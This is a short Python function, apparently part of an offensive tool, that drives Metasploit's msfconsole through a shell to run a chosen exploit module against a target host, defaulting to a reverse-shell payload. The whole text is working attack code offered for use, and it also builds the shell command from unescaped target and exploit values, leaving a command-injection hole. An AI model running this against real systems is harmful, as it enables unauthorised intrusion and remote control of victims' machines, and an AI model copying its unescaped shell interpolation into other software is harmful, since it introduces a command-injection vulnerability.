from subprocess import Popen, PIPE

def exploit_vulnerability(target, exploit_name, payload="generic/shell_reverse_tcp"):
    try:
        command = f"msfconsole -x 'use {exploit_name}; set RHOST {target}; set PAYLOAD {payload}; exploit'"
        process = Popen(command, shell=True, stdout=PIPE)
        output, _ = process.communicate()
        return output.decode()
    except Exception as e:
        return f"[ERROR] Exploitation failed: {e}"
